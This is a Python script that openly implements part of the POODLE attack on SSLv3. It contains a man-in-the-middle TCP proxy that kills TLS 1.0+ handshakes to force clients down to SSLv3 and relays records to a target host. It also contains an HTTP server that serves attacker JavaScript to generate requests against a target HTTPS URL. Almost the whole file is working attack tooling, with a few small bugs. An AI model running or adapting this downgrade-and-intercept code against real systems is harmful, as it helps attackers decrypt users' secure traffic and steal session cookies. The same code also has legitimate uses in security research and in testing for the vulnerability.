#!/usr/bin/python3
# Implementation of the POODLE attack.
# Copyright 2014 Thomas Skora <thomas@skora.net>
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import argparse
from urllib.parse import urlparse
import sys
import socket
import socketserver
import http.server
import struct
import select
from multiprocessing import Process, Queue

### Configuration ###
# select() timeout
timeout = 30.0

### TLS/SSL ###
class TLSRecord:
    tlsContentType = {20: 'change_cipher_spec', 21: 'alert', 22: 'handshake', 23: 'application_data'}

    def __init__(self, rsocket):
        self.raw = rsocket.recv(5)
        if len(self.raw) < 5:
            raise TypeError("Not a SSL/TLS packet")
        self.contentType, self.majorVersion, self.minorVersion, self.length = struct.unpack("!BBBH", self.raw)
        self.textContentType = self.tlsContentType[self.contentType]
        self.content = rsocket.recv(self.length)
        self.raw += self.content


class SSLTLSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        print_debug("Received connection from {}".format(self.client_address[0]))
        tlsRecord = TLSRecord(self.request)
        if (tlsRecord.contentType == 0x16 and tlsRecord.majorVersion == 0x03 and tlsRecord.minorVersion > 0x00):       # TLS >= 1.0 handshake -> kill it to degrade!
            print_debug("Protocol minor version {:d} - trying to degrade.".format(tlsRecord.minorVersion))
            return
        else:
            print_debug("Client uses SSLv3")
        
        try:
            self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.forward.connect((args.target_host, args.target_port))
            self.forward.sendall(tlsRecord.raw)
            while (True):
                readable, writable, errors = select.select((self.request, self.forward), (), (self.request, self.forward), timeout)
                if len(errors) > 0:
                    sockname = "unknown"
                    if errors[0] == self.request:
                            sockname = "client-side"
                    elif errors[0] == self.forward:
                            sockname == "server-side"
                    print_debug(sockname + " socket signalizes an error!")
                    break

                for rsocket in readable:
                    ssocket = None
                    rsockname = "unknown"
                    ssockname = "unknown"
                    if rsocket == self.request:
                        ssocket = self.forward
                        rsockname = "client"
                        ssockname = "server"
                    else:
                        ssocket = self.request
                        ssockname = "client"
                        rsockname = "server"
                    
                    record = TLSRecord(rsocket)
                    print_debug("Forwarding TLS record type {} of length {:d} from {} to {}".format(record.textContentType, len(record.raw), rsockname, ssockname))
                    ssocket.sendall(record.raw)
                                    
        except IOError as e:
            print_debug("I/O error: {} ({})".format(e.strerror, e.errno))
        except TypeError:
            pass
        except StopIteration:
            pass
        except Exception as e:
            print("Exception: " + e.strerror)
        finally:
            self.forward.close()
            print_debug("Connection closed!")


class SSLTLSProxy(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True

### HTTP ###
class PoodleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if (self.path == "/"):
            self.sendRequestGenerator()

    def sendRequestGenerator(self):
        self.send_response(200);
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        response = """<!DOCTYPE html>
        <h1>POODLE Request Generator</h1>
        <script type="text/javascript">
        """ + jsCode + """
        </script>
        """
        response = response.replace("###URL###", args.targetURL)
        self.wfile.write(bytes(response, "utf-8"))

    def version_string(self):
        return "POODLE Request Generator"

### Functions ###
def ssltlsServer(queue):
    print("Starting SSL/TLS server on {}:{} forwarding to {}:{}".format(args.listen_host, args.listen_port_tls, args.target_host, args.target_port))
    server = SSLTLSProxy((args.listen_host, int(args.listen_port_tls)), SSLTLSHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Shutdown of SSL/TLS server on user request")

def httpServer(queue):
    print("Starting HTTP server on {}:{} generating requests to {}".format(args.listen_host, args.listen_port_http, args.targetURL))
    server = http.server.HTTPServer((args.listen_host, int(args.listen_port_http)), PoodleHTTPRequestHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Shutdown of HTTP server on user request")

def print_debug(msg):
    if (args.debug):
        print(msg)

### Main ###
argparser = argparse.ArgumentParser(description="The POODLE Attack")
argparser.add_argument("targetURL", help="Target URL. Requests are performed against this URL and TLS forwardings are derived from this.")
argparser.add_argument("--listen-host", "-lh", default="", help="TLS/SSL and HTTP listening host")
argparser.add_argument("--listen-port-tls", "-lpt", default="8443", help="TLS/SSL listening port")
argparser.add_argument("--listen-port-http", "-lph", default="8000", help="HTTP listening port")
argparser.add_argument("--target-host", "-th", default=None, help="Target host override, normally derived from target URL")
argparser.add_argument("--target-port", "-tp", default=None, help="Target port override, normally derived from target URL")
argparser.add_argument("--debug", "-d", action="store_true", help="Debugging output")
args = argparser.parse_args()
targetURL = urlparse(args.targetURL)
args.target_host = args.target_host or targetURL.hostname
args.target_port = int(args.target_port) or int(targetURL.port) or 443
if (targetURL.scheme != "https"):
    print("Target must be HTTPS URL!");
    sys.exit(1)
if (args.target_host == None):
    print("Can't determine target host!");
    sys.exit(2)

jsFile = open("POODLEClient.js", "r")
jsCode = jsFile.read()
jsFile.close()

commandQueue = Queue()
poodleSSLTLSServer = Process(target=ssltlsServer, args=(commandQueue,))
poodleSSLTLSServer.start()
poodleHTTPServer = Process(target=httpServer, args=(commandQueue,))
poodleHTTPServer.start()

try:
    poodleSSLTLSServer.join()
    poodleHTTPServer.join()
except KeyboardInterrupt:
    print("Bye!")
